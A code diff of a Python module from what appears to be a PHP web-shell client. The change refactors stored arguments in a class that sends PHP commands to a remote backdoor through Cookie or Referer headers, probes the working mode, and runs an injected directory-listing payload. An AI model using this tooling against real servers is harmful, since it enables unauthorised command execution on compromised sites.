@@ -7,7 +7,7 @@ Created on 22/ago/2011
 from core.module import Module
 from core.moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
 from core.http.cmdrequest import CmdRequest, NoDataException
-from core.storedargparse import StoredArgumentParser as ArgumentParser
+from core.argparse import ArgumentParser, StoredNamespace
 from core.argparse import SUPPRESS
 from ast import literal_eval
 
@@ -30,10 +30,10 @@ class Php(Module):
 
     mode_choices = ['Cookie', 'Referer' ]
 
-
-    def _init_module(self):
-        self.stored_args = { 'mode' : None, 'path' : '' }
-
+    def _init_stored_args(self):
+        self.stored_args_namespace = StoredNamespace()
+        setattr(self.stored_args_namespace, 'mode', None)
+        setattr(self.stored_args_namespace, 'path', '')
 
     
     def _set_args(self):
@@ -42,7 +42,7 @@ class Php(Module):
         self.argparser.add_argument('-proxy', help='HTTP proxy. Support \'http://\', \'socks5://\', \'socks4://\'')
         self.argparser.add_argument('-precmd', help='Insert string at beginning of commands', nargs='+'  )
         self.argparser.add_argument('-debug', help='Change debug class (3 or less to show request and response)', type=int, default=4, choices =range(1,5))
-        self.argparser.add_argument('-post', help=SUPPRESS, type=literal_eval, default={})
+        self.argparser.add_argument('-post', help=SUPPRESS, type=type({}), default={})
         self.argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
 
 
@@ -52,10 +52,10 @@ class Php(Module):
         # Avoid probing (and storing) if mode is specified by user
         
         if not self.args['mode'] or self.args['just_probe']:
-            if not self.stored_args['mode'] or self.args['just_probe']:
+            if not getattr(self.stored_args_namespace,'mode') or self.args['just_probe']:
                 self.__slacky_probe()
                 
-            self.args['mode'] = self.stored_args['mode']
+            self.args['mode'] = getattr(self.stored_args_namespace,'mode')
         
         
         # Check if is raw command is not 'ls' 
@@ -66,8 +66,8 @@ class Php(Module):
                 self.mprint('\'..%s\' %s' % (self.args['cmd'][-1], WARN_TRAILING_SEMICOLON))
           
             # Prepend chdir
-            if self.stored_args['path']:
-                self.args['cmd'] = [ 'chdir(\'%s\');' % (self.stored_args['path']) ] + self.args['cmd'] 
+            if getattr(self.stored_args_namespace,'path'):
+                self.args['cmd'] = [ 'chdir(\'%s\');' % (getattr(self.stored_args_namespace,'path')) ] + self.args['cmd'] 
                 
             # Prepend precmd
             if self.args['precmd']:
@@ -139,7 +139,7 @@ class Php(Module):
             
             if response == rand:
                 
-                self.stored_args['mode'] = currentmode
+                setattr(self.stored_args_namespace, 'mode', currentmode)
                 
                 if self.args['just_probe']:
                     self._result = True 
@@ -158,19 +158,19 @@ class Php(Module):
         
         if len(cmd_splitted)>2:
             raise ProbeException(self.name, WARN_LS_ARGS)
-        elif len(cmd_splitted)==2 and self.stored_args['path']:
+        elif len(cmd_splitted)==2 and hasattr(self.stored_args_namespace, 'path'):
             # Should join with remote os.sep, but this should work (PHP support '\' as '/')
-            path = os.path.join(self.stored_args['path'], cmd_splitted[1])
+            path = os.path.join(getattr(self.stored_args_namespace, 'path'), cmd_splitted[1])
         elif len(cmd_splitted)==2:
             # Is that fallback useful?
             path = cmd_splitted[1]
-        elif self.stored_args['path']:
-            path = self.stored_args['path']
+        elif hasattr(self.stored_args_namespace, 'path'):
+            path = getattr(self.stored_args_namespace, 'path')
         else:
             path = '.'
 
         if path:
-            response = self.__do_request("$path=\"%s\"; $d=@opendir($path); $a=array(); if($d) { while(($f = readdir($d))) { $a[]=$f; }; sort($a); print(join('\n', $a)); }" % path, self.stored_args['mode'])
+            response = self.__do_request("$path=\"%s\"; $d=@opendir($path); $a=array(); if($d) { while(($f = readdir($d))) { $a[]=$f; }; sort($a); print(join('\n', $a)); }" % path, getattr(self.stored_args_namespace, 'mode'))
             
             if response:
                 return response
